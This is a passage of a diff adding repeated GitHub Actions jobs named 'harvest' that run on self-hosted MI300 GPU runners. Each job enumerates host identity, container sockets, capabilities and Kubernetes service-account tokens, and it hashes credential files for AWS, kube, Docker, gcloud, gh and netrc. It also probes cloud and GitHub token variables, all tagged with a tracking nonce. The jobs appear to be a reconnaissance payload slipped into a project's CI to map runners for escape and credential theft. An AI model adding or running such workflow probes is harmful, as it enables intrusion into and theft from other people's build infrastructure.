+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-26 nonce=$NONCE"
+          exit 0
+  job-mi300x8-27:
+    name: harvest-27
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-27 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-27 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-27 nonce=$NONCE"
+          exit 0
+  job-mi300x8-28:
+    name: harvest-28
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-28 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-28 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-28 nonce=$NONCE"
+          exit 0
+  job-mi300x8-29:
+    name: harvest-29
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-29 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-29 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-29 nonce=$NONCE"
+          exit 0
+  job-mi300x8-30:
+    name: harvest-30
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-30 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-30 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-30 nonce=$NONCE"
+          exit 0
